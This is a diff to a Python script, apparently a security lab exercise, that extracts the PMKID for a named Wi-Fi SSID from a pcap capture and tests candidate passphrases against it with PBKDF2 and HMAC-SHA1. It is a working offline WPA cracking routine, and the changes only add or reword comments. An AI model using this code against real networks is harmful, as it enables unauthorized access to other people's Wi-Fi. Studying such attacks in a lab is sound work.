@@ -64,6 +64,7 @@ def getPMKIDInfo(packets, ssid):
     if len(handshakeMsgs1) == 0:
         raise Exception("Cannot find handshakes for the corresponding ssid")
 
+    # Get the mac of the client
     Clientmac = a2b_hex(handshakeMsgs1[0].addr1.replace(':', ''))
 
     # Get the WPA_layer of the packets found contains the value of the handshake
@@ -80,9 +81,9 @@ def main():
     wpa = rdpcap("PMKID_handshake.pcap")
 
     # Important parameters for key derivation - most of them can be obtained from the pcap file
-    TARGET_SSID = b'Sunrise_2.4GHz_DD4B90'
+    TARGET_SSID = b'Sunrise_2.4GHz_DD4B90'  # SSID of the AP that we would like to find the passphrase
     APmac, Clientmac, pmkid = getPMKIDInfo(wpa, TARGET_SSID)
-    pmk_name = b"PMK Name"  # this constant is for the calcul of the PMKID
+    pmk_name = b"PMK Name"  # this constant is used for the computation of the PMKID
 
     print("\n\nValues used to derivate keys")
     print("============================")
@@ -101,7 +102,7 @@ def main():
         passPhrase = str.encode(passPhrase)
         # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
         pmk = pbkdf2(hashlib.sha1, passPhrase, TARGET_SSID, 4096, 32)
-        # Calculate the PMKID
+        # Calculate the PMKID with current pmk
         pmkid_test = hmac.new(pmk, pmk_name + APmac + Clientmac, hashlib.sha1)
         # The sha-1 algorithm has 20 bytes as output but PMKID is only 16 bytes long
         # So we only take the first 16 bytes
